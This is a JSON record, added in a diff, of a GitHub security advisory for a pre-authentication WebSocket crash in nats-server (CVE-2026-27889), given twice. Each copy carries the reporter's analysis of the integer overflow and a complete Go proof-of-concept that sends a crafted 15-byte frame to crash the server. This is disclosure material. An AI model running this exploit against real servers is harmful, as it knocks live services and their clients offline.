@@ -1,0 +1,113 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-27889",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_v4": {
+        "score": 0,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-190"
+    ],
+    "description": "### Background\n\nNATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.\n\nWhen using WebSockets, a malicious client can trigger a server crash with crafted frames, before authentication.\n\n\n### Problem Description\n\nA missing sanity check on a WebSockets frame could trigger a server panic in the nats-server.  This happens before authentication, and so is exposed to anyone who can connect to the websockets port.\n\n### Affected versions\n\nVersion 2 from v2.2.0 onwards, prior to v2.11.14 or v2.12.5\n\n### Workarounds\n\nThis only affects deployments which use WebSockets and which expose the network port to untrusted end-points.  If able to do so, a defense in depth of restricting either of these will mitigate the attack.\n\n### Solution\n\nUpgrade the NATS server to a fixed version.\n\n### Credits\n\nThis was reported to the NATS maintainers by GitHub user Mistz1.\nAlso independently reported by GitHub user jiayuqi7813.\n\n-----\n\n## Report by @Mistz1 \n\n### Summary\n\nAn unauthenticated remote attacker can crash the entire nats-server process by sending a single malicious WebSocket frame (15 bytes after the HTTP upgrade handshake). The server fails to validate the RFC 6455 §5.2 requirement that the most significant bit of a 64-bit extended payload length must be zero. The resulting `uint64` → `int` conversion produces a negative value, which bypasses the bounds clamp and triggers an unrecovered `panic` in the connection's goroutine - killing the entire server process and disconnecting all clients. This affects all platforms (64-bit and 32-bit).\n\n### Details\n\n**Vulnerable code:** [`server/websocket.go` line 278](https://github.com/nats-io/nats-server/blob/a69f51f/server/websocket.go#L278)\n\n```go\nr.rem = int(binary.BigEndian.Uint64(tmpBuf))\n```\n\nWhen a WebSocket frame uses the 64-bit extended payload length (length code 127), the server reads 8 bytes and casts the raw `uint64` directly to `int` with no validation. RFC 6455 §5.2 states: *\"the most significant bit MUST be 0\"* - but nats-server never checks this.\n\n**Attack chain:**\n\n1. The attacker sends a WebSocket frame with the MSB set in the 64-bit length field (e.g., `0x8000000000000001`).\n\n2. At line 278, `int(0x8000000000000001)` produces `-9223372036854775807` on 64-bit Go (two's complement reinterpretation - Go does not panic on integer conversion overflow).\n\n3. `r.rem` is now negative. At line 307-311, the bounds clamp fails:\n\n   ```go\n   n = r.rem                    // n = -9223372036854775807\n   if pos+n > max {             // 14 + (-huge) = negative, NOT > max → FALSE\n       n = max - pos            // clamp NEVER fires\n   }\n   b = buf[pos : pos+n]         // buf[14 : -9223372036854775793] → PANIC\n   ```\n\n   The addition `pos + n` wraps to a negative value (Go signed integer overflow is defined behavior - it wraps silently). Since the negative result is never greater than `max`, the clamp is skipped. The slice expression at line 311 reaches the Go runtime bounds check, which panics.\n\n4. There is **no `defer recover()`** anywhere in the goroutine chain:\n   - [`startGoRoutine`](https://github.com/nats-io/nats-server/blob/a69f51f/server/server.go#L4076-L4079): `go func() { f() }()` - no recovery\n   - [`readLoop`](https://github.com/nats-io/nats-server/blob/a69f51f/server/client.go#L1387-L1394): defer only does cleanup - no recovery\n\n   The unrecovered panic propagates to Go's runtime, which calls `os.Exit(2)`. The **entire nats-server process terminates**.\n\n5. The WebSocket frame is parsed in `wsRead()` called from `readLoop()`, which starts immediately after the HTTP upgrade - **before any NATS CONNECT authentication**. No credentials are required.\n\n**Why 15 bytes, not 14:** The 14-byte frame header (opcode + length + mask key) exactly fills the read buffer on the first call, so `pos == max` and the payload loop at line 303 (`if pos < max`) is skipped. The poisoned `r.rem` persists in the `wsReadInfo` struct. One additional byte of \"payload\" is needed so that `pos < max` on either the same or next read, entering the panic path at line 311.\n\n### PoC\n\n**Server configuration** (`test-ws.conf`):\n```\nlisten: 127.0.0.1:4222\n\nwebsocket {\n    listen: \"127.0.0.1:9222\"\n    no_tls: true\n}\n```\n\n**Start the server:**\n```bash\nnats-server -c test-ws.conf\n```\n\n**Exploit** (`poc_ws_crash.go`):\n```go\npackage main\n\nimport (\n\t\"bufio\"\n\t\"encoding/binary\"\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"os\"\n\t\"time\"\n)\n\nfunc main() {\n\ttarget := \"127.0.0.1:9222\"\n\tif len(os.Args) > 1 {\n\t\ttarget = os.Args[1]\n\t}\n\n\tfmt.Printf(\"[*] Connecting to %s...\\n\", target)\n\tconn, err := net.DialTimeout(\"tcp\", target, 5*time.Second)\n\tif err != nil {\n\t\tfmt.Printf(\"[-] Connection failed: %v\\n\", err)\n\t\tos.Exit(1)\n\t}\n\tdefer conn.Close()\n\n\t// WebSocket upgrade\n\treq, _ := http.NewRequest(\"GET\", \"http://\"+target, nil)\n\treq.Header.Set(\"Upgrade\", \"websocket\")\n\treq.Header.Set(\"Connection\", \"Upgrade\")\n\treq.Header.Set(\"Sec-WebSocket-Key\", \"dGhlIHNhbXBsZSBub25jZQ==\")\n\treq.Header.Set(\"Sec-WebSocket-Version\", \"13\")\n\treq.Header.Set(\"Sec-WebSocket-Protocol\", \"nats\")\n\treq.Write(conn)\n\n\tconn.SetReadDeadline(time.Now().Add(5 * time.Second))\n\tresp, err := http.ReadResponse(bufio.NewReader(conn), req)\n\tif err != nil || resp.StatusCode != 101 {\n\t\tfmt.Printf(\"[-] Upgrade failed\\n\")\n\t\tos.Exit(1)\n\t}\n\tfmt.Println(\"[+] WebSocket established\")\n\tconn.SetReadDeadline(time.Time{})\n\n\t// Malicious frame: FIN+Binary, MASK+127, 8-byte length with MSB set, mask key, 1 payload byte\n\tframe := make([]byte, 15)\n\tframe[0] = 0x82                                             // FIN + Binary\n\tframe[1] = 0xFF                                             // MASK + 127 (64-bit length)\n\tbinary.BigEndian.PutUint64(frame[2:10], 0x8000000000000001) // MSB set\n\tframe[10] = 0xDE                                            // Mask key\n\tframe[11] = 0xAD\n\tframe[12] = 0xBE\n\tframe[13] = 0xEF\n\tframe[14] = 0x41                                            // 1 payload byte\n\n\tfmt.Printf(\"[*] Sending: %x\\n\", frame)\n\tconn.Write(frame)\n\n\ttime.Sleep(2 * time.Second)\n\n\t// Verify crash\n\tconn2, err := net.DialTimeout(\"tcp\", target, 3*time.Second)\n\tif err != nil {\n\t\tfmt.Println(\"[!!!] SERVER IS DOWN - full process crash confirmed\")\n\t\tos.Exit(0)\n\t}\n\tconn2.Close()\n\tfmt.Println(\"[-] Server still running\")\n}\n```\n\n**Run:**\n```bash\ngo build -o poc_ws_crash poc_ws_crash.go\n./poc_ws_crash\n```\n\n**Observed server output before termination:**\n```\npanic: runtime error: slice bounds out of range [:-9223372036854775793]\n\ngoroutine 13 [running]:\ngithub.com/nats-io/nats-server/v2/server.(*client).wsRead(...)\n        server/websocket.go:311 +0xa93\ngithub.com/nats-io/nats-server/v2/server.(*client).readLoop(...)\n        server/client.go:1434 +0x768\ngithub.com/nats-io/nats-server/v2/server.(*Server).startGoRoutine.func1()\n        server/server.go:4078 +0x32\n```\n\n**Tested against:** nats-server v2.14.0-dev (commit `a69f51f`), Go 1.25.7, linux/amd64.\n\n### Impact\n\n**Vulnerability type:** Pre-authentication remote denial of service (full process crash).\n\n**Who is impacted:** Any nats-server deployment with WebSocket listeners enabled (`websocket { ... }` in config), including MQTT-over-WebSocket. This is an increasingly common configuration for browser-based and IoT clients. The attacker needs only TCP access to the WebSocket port - no credentials, no valid NATS client, no TLS client certificate.\n\n**Severity:** A single unauthenticated TCP connection sending 15 bytes crashes the entire server process. All connected clients (NATS, WebSocket, MQTT, cluster routes, gateways, leaf nodes) are immediately disconnected. JetStream in-flight acknowledgments are lost and Raft consensus is disrupted in clustered deployments. The attack is repeatable on every server restart.\n\n**Affected platforms:** All - confirmed on 64-bit (linux/amd64); 32-bit platforms (linux/386, linux/arm) are also affected with additional frame-desync consequences.\n\n( NATS retains the original external report below the cut, with exploit details.\nThis issue was also independently reported by GitHub user @jiayuqi7813 before publication; they provided a Python exploit.)",
+    "ghsa_id": "GHSA-pq2q-rcw4-3hr6",
+    "html_url": "https://github.com/advisories/GHSA-pq2q-rcw4-3hr6",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-pq2q-rcw4-3hr6"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-27889"
+      }
+    ],
+    "published_at": "2026-03-25T17:07:51Z",
+    "references": [
+      "https://github.com/nats-io/nats-server/security/advisories/GHSA-pq2q-rcw4-3hr6",
+      "https://advisories.nats.io/CVE/secnote-2026-03.txt",
+      "https://nvd.nist.gov/vuln/detail/CVE-2026-27889",
+      "https://github.com/advisories/GHSA-pq2q-rcw4-3hr6"
+    ],
+    "severity": "high",
+    "summary": "NATS: Pre-auth remote server crash via WebSocket frame length overflow in wsRead",
+    "updated_at": "2026-03-27T22:09:13Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "2.11.14",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/nats-io/nats-server/v2"
+        },
+        "vulnerable_version_range": ">= 2.2.0, < 2.11.14"
+      },
+      {
+        "first_patched_version": "2.12.5",
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/nats-io/nats-server/v2"
+        },
+        "vulnerable_version_range": ">= 2.12.0, < 2.12.5"
+      },
+      {
+        "first_patched_version": null,
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/nats-io/nats-server"
+        },
+        "vulnerable_version_range": "> 0"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-pq2q-rcw4-3hr6",
+  "repo": {
+    "cve_id": "CVE-2026-27889",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 7.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "( We retain the original external report below the cut, with exploit details.\r\nThis issue was also independently reported by GitHub user @jiayuqi7813 before publication; they provided a Python exploit. )\r\n\r\n### Background\r\n\r\nNATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.\r\n\r\nWhen using WebSockets, a malicious client can trigger a server crash with crafted frames, before authentication.\r\n\r\n\r\n### Problem Description\r\n\r\nA missing sanity check on a WebSockets frame could trigger a server panic in the nats-server.  This happens before authentication, and so is exposed to anyone who can connect to the websockets port.\r\n\r\n### Affected versions\r\n\r\nVersion 2 from v2.2.0 onwards, prior to v2.11.14 or v2.12.5\r\n\r\n### Workarounds\r\n\r\nThis only affects deployments which use WebSockets and which expose the network port to untrusted end-points.  If able to do so, a defense in depth of restricting either of these will mitigate the attack.\r\n\r\n### Solution\r\n\r\nUpgrade the NATS server to a fixed version.\r\n\r\n### Credits\r\n\r\nThis was reported to the NATS maintainers by GitHub user Mistz1.\r\nAlso independently reported by GitHub user jiayuqi7813.\r\n\r\n### References\r\n\r\n * This document is canonically: <https://advisories.nats.io/CVE/secnote-2026-03.txt>\r\n * GHSA advisory: <https://github.com/nats-io/nats-server/security/advisories/GHSA-pq2q-rcw4-3hr6>\r\n * MITRE CVE entry: <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27889>\r\n\r\n-----\r\n\r\n## Report by @Mistz1 \r\n\r\n### Summary\r\n\r\nAn unauthenticated remote attacker can crash the entire nats-server process by sending a single malicious WebSocket frame (15 bytes after the HTTP upgrade handshake). The server fails to validate the RFC 6455 §5.2 requirement that the most significant bit of a 64-bit extended payload length must be zero. The resulting `uint64` → `int` conversion produces a negative value, which bypasses the bounds clamp and triggers an unrecovered `panic` in the connection's goroutine - killing the entire server process and disconnecting all clients. This affects all platforms (64-bit and 32-bit).\r\n\r\n### Details\r\n\r\n**Vulnerable code:** [`server/websocket.go` line 278](https://github.com/nats-io/nats-server/blob/a69f51f/server/websocket.go#L278)\r\n\r\n```go\r\nr.rem = int(binary.BigEndian.Uint64(tmpBuf))\r\n```\r\n\r\nWhen a WebSocket frame uses the 64-bit extended payload length (length code 127), the server reads 8 bytes and casts the raw `uint64` directly to `int` with no validation. RFC 6455 §5.2 states: *\"the most significant bit MUST be 0\"* - but nats-server never checks this.\r\n\r\n**Attack chain:**\r\n\r\n1. The attacker sends a WebSocket frame with the MSB set in the 64-bit length field (e.g., `0x8000000000000001`).\r\n\r\n2. At line 278, `int(0x8000000000000001)` produces `-9223372036854775807` on 64-bit Go (two's complement reinterpretation - Go does not panic on integer conversion overflow).\r\n\r\n3. `r.rem` is now negative. At line 307-311, the bounds clamp fails:\r\n\r\n   ```go\r\n   n = r.rem                    // n = -9223372036854775807\r\n   if pos+n > max {             // 14 + (-huge) = negative, NOT > max → FALSE\r\n       n = max - pos            // clamp NEVER fires\r\n   }\r\n   b = buf[pos : pos+n]         // buf[14 : -9223372036854775793] → PANIC\r\n   ```\r\n\r\n   The addition `pos + n` wraps to a negative value (Go signed integer overflow is defined behavior - it wraps silently). Since the negative result is never greater than `max`, the clamp is skipped. The slice expression at line 311 reaches the Go runtime bounds check, which panics.\r\n\r\n4. There is **no `defer recover()`** anywhere in the goroutine chain:\r\n   - [`startGoRoutine`](https://github.com/nats-io/nats-server/blob/a69f51f/server/server.go#L4076-L4079): `go func() { f() }()` - no recovery\r\n   - [`readLoop`](https://github.com/nats-io/nats-server/blob/a69f51f/server/client.go#L1387-L1394): defer only does cleanup - no recovery\r\n\r\n   The unrecovered panic propagates to Go's runtime, which calls `os.Exit(2)`. The **entire nats-server process terminates**.\r\n\r\n5. The WebSocket frame is parsed in `wsRead()` called from `readLoop()`, which starts immediately after the HTTP upgrade - **before any NATS CONNECT authentication**. No credentials are required.\r\n\r\n**Why 15 bytes, not 14:** The 14-byte frame header (opcode + length + mask key) exactly fills the read buffer on the first call, so `pos == max` and the payload loop at line 303 (`if pos < max`) is skipped. The poisoned `r.rem` persists in the `wsReadInfo` struct. One additional byte of \"payload\" is needed so that `pos < max` on either the same or next read, entering the panic path at line 311.\r\n\r\n### PoC\r\n\r\n**Server configuration** (`test-ws.conf`):\r\n```\r\nlisten: 127.0.0.1:4222\r\n\r\nwebsocket {\r\n    listen: \"127.0.0.1:9222\"\r\n    no_tls: true\r\n}\r\n```\r\n\r\n**Start the server:**\r\n```bash\r\nnats-server -c test-ws.conf\r\n```\r\n\r\n**Exploit** (`poc_ws_crash.go`):\r\n```go\r\npackage main\r\n\r\nimport (\r\n\t\"bufio\"\r\n\t\"encoding/binary\"\r\n\t\"fmt\"\r\n\t\"net\"\r\n\t\"net/http\"\r\n\t\"os\"\r\n\t\"time\"\r\n)\r\n\r\nfunc main() {\r\n\ttarget := \"127.0.0.1:9222\"\r\n\tif len(os.Args) > 1 {\r\n\t\ttarget = os.Args[1]\r\n\t}\r\n\r\n\tfmt.Printf(\"[*] Connecting to %s...\\n\", target)\r\n\tconn, err := net.DialTimeout(\"tcp\", target, 5*time.Second)\r\n\tif err != nil {\r\n\t\tfmt.Printf(\"[-] Connection failed: %v\\n\", err)\r\n\t\tos.Exit(1)\r\n\t}\r\n\tdefer conn.Close()\r\n\r\n\t// WebSocket upgrade\r\n\treq, _ := http.NewRequest(\"GET\", \"http://\"+target, nil)\r\n\treq.Header.Set(\"Upgrade\", \"websocket\")\r\n\treq.Header.Set(\"Connection\", \"Upgrade\")\r\n\treq.Header.Set(\"Sec-WebSocket-Key\", \"dGhlIHNhbXBsZSBub25jZQ==\")\r\n\treq.Header.Set(\"Sec-WebSocket-Version\", \"13\")\r\n\treq.Header.Set(\"Sec-WebSocket-Protocol\", \"nats\")\r\n\treq.Write(conn)\r\n\r\n\tconn.SetReadDeadline(time.Now().Add(5 * time.Second))\r\n\tresp, err := http.ReadResponse(bufio.NewReader(conn), req)\r\n\tif err != nil || resp.StatusCode != 101 {\r\n\t\tfmt.Printf(\"[-] Upgrade failed\\n\")\r\n\t\tos.Exit(1)\r\n\t}\r\n\tfmt.Println(\"[+] WebSocket established\")\r\n\tconn.SetReadDeadline(time.Time{})\r\n\r\n\t// Malicious frame: FIN+Binary, MASK+127, 8-byte length with MSB set, mask key, 1 payload byte\r\n\tframe := make([]byte, 15)\r\n\tframe[0] = 0x82                                             // FIN + Binary\r\n\tframe[1] = 0xFF                                             // MASK + 127 (64-bit length)\r\n\tbinary.BigEndian.PutUint64(frame[2:10], 0x8000000000000001) // MSB set\r\n\tframe[10] = 0xDE                                            // Mask key\r\n\tframe[11] = 0xAD\r\n\tframe[12] = 0xBE\r\n\tframe[13] = 0xEF\r\n\tframe[14] = 0x41                                            // 1 payload byte\r\n\r\n\tfmt.Printf(\"[*] Sending: %x\\n\", frame)\r\n\tconn.Write(frame)\r\n\r\n\ttime.Sleep(2 * time.Second)\r\n\r\n\t// Verify crash\r\n\tconn2, err := net.DialTimeout(\"tcp\", target, 3*time.Second)\r\n\tif err != nil {\r\n\t\tfmt.Println(\"[!!!] SERVER IS DOWN - full process crash confirmed\")\r\n\t\tos.Exit(0)\r\n\t}\r\n\tconn2.Close()\r\n\tfmt.Println(\"[-] Server still running\")\r\n}\r\n```\r\n\r\n**Run:**\r\n```bash\r\ngo build -o poc_ws_crash poc_ws_crash.go\r\n./poc_ws_crash\r\n```\r\n\r\n**Observed server output before termination:**\r\n```\r\npanic: runtime error: slice bounds out of range [:-9223372036854775793]\r\n\r\ngoroutine 13 [running]:\r\ngithub.com/nats-io/nats-server/v2/server.(*client).wsRead(...)\r\n        server/websocket.go:311 +0xa93\r\ngithub.com/nats-io/nats-server/v2/server.(*client).readLoop(...)\r\n        server/client.go:1434 +0x768\r\ngithub.com/nats-io/nats-server/v2/server.(*Server).startGoRoutine.func1()\r\n        server/server.go:4078 +0x32\r\n```\r\n\r\n**Tested against:** nats-server v2.14.0-dev (commit `a69f51f`), Go 1.25.7, linux/amd64.\r\n\r\n### Impact\r\n\r\n**Vulnerability type:** Pre-authentication remote denial of service (full process crash).\r\n\r\n**Who is impacted:** Any nats-server deployment with WebSocket listeners enabled (`websocket { ... }` in config), including MQTT-over-WebSocket. This is an increasingly common configuration for browser-based and IoT clients. The attacker needs only TCP access to the WebSocket port - no credentials, no valid NATS client, no TLS client certificate.\r\n\r\n**Severity:** A single unauthenticated TCP connection sending 15 bytes crashes the entire server process. All connected clients (NATS, WebSocket, MQTT, cluster routes, gateways, leaf nodes) are immediately disconnected. JetStream in-flight acknowledgments are lost and Raft consensus is disrupted in clustered deployments. The attack is repeatable on every server restart.\r\n\r\n**Affected platforms:** All - confirmed on 64-bit (linux/amd64); 32-bit platforms (linux/386, linux/arm) are also affected with additional frame-desync consequences.\r\n",
+    "ghsa_id": "GHSA-pq2q-rcw4-3hr6",
+    "html_url": "https://github.com/nats-io/nats-server/security/advisories/GHSA-pq2q-rcw4-3hr6",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-pq2q-rcw4-3hr6"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-27889"
+      }
+    ],
+    "published_at": "2026-03-24T21:10:57Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Pre-auth remote server crash via WebSocket frame length overflow in wsRead",
+    "updated_at": "2026-03-24T21:10:57Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/nats-io/nats-server/v2"
+        },
+        "patched_versions": "v2.11.14, v2.12.5",
+        "vulnerable_version_range": ">= 2.2.0, <= v2.11.12, <= v2.12.4"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "nats-io/nats-server"
+}
